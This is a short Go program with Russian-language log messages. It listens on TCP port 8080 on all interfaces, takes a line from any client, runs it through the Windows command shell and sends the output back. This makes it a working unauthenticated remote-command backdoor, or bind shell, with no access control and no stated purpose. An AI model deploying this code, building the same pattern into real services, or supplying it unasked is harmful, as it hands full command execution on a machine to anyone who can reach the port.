package main

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"strings"
)

func main() {
	listener, err := net.Listen("tcp", ":8080")
	if err != nil {
		fmt.Println("Ошибка при запуске сервера:", err)
		return
	}
	defer listener.Close()
	fmt.Println("Сервер запущен на порту 8080")

	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("Ошибка при подключении:", err)
			continue
		}
		go handleConnection(conn)
	}
}

func handleConnection(conn net.Conn) {
	defer conn.Close()

	reader := bufio.NewReader(conn)
	command, err := reader.ReadString('\n')
	if err != nil {
		fmt.Println("Ошибка чтения данных:", err)
		return
	}

	command = strings.TrimSpace(command)
	fmt.Println("Получена команда:", command)

	output, err := exec.Command("cmd", "/C", command).CombinedOutput()
	if err != nil {
		output = []byte("Ошибка выполнения команды: " + err.Error())
	}

	conn.Write(output)
}
